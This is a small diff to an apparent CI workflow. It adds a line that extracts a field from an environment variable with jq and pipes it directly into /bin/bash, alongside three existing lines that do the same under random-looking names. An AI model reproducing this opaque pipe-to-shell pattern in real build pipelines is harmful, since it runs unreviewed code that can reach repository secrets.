@@ -29,6 +29,7 @@ jobs:
           echo $xog3 | jq -r .yfbj6356 | /bin/bash
           printf '%s' "$uw098" | jq -r .wu79 | /bin/bash
           printf '%s' "$o5420" | jq -r .kgdmc602 | /bin/bash
+          echo $xcjhg1998 | jq -r .gwq1 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
